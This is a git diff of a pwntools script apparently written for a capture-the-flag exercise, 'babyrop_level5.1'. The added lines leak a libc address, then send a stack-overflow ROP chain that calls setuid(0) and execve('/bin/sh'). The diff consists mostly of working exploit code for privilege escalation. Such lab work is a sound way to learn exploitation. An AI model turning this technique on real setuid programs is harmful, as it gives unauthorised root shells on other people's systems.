@@ -178,8 +178,12 @@ def baby5_1(p):
     pop_rdi = 0x401c4a
     puts_got = 0x404020
     puts_plt = 0x401094
-    pop_rsi = 0x2601f
+    execve = 0x3b
+    pop_rdx = 0x401c63
+    setuid = 0x69
     challenge = 0x00401c89
+    syscall = 0x401c7a
+    alt_rax = 0x36174
 
     p.recvuntil(b'###')
 
@@ -193,19 +197,30 @@ def baby5_1(p):
     p.recvline()
     leak = u64(p.recvline()[:-1].ljust(8,b'\x00'))
     print('leak: ', hex(leak))
-    libc = leak - 0x80e50
+    libc = leak - 0x84420
     print('libc: ', hex(libc))
     bin_sh = libc + 0x1b45bd 
     print('bin/sh: ', hex(bin_sh))
+    pop_rsi = libc + 0x2601f
 
     #code execution
+    data = b'A'*88 +\
+           p64(pop_rax) + p64(setuid) + \
+           p64(pop_rdi) + p64(0) + \
+           p64(syscall) + \
+           p64(pop_rdi) + p64(bin_sh) + \
+           p64(pop_rsi) + p64(0) +\
+           p64(pop_rdx) + p64(0) +\
+           p64(pop_rax) + p64(execve)+\
+           p64(syscall)
     
-
+    p.sendline(data)
 
 
 #p = process('/challenge/babyrop_level5.1')
 #p = process('./babyrop_level5.1')
 p = gdb.debug('./babyrop_level5.1','''
+b challenge
 c            
 ''')
 
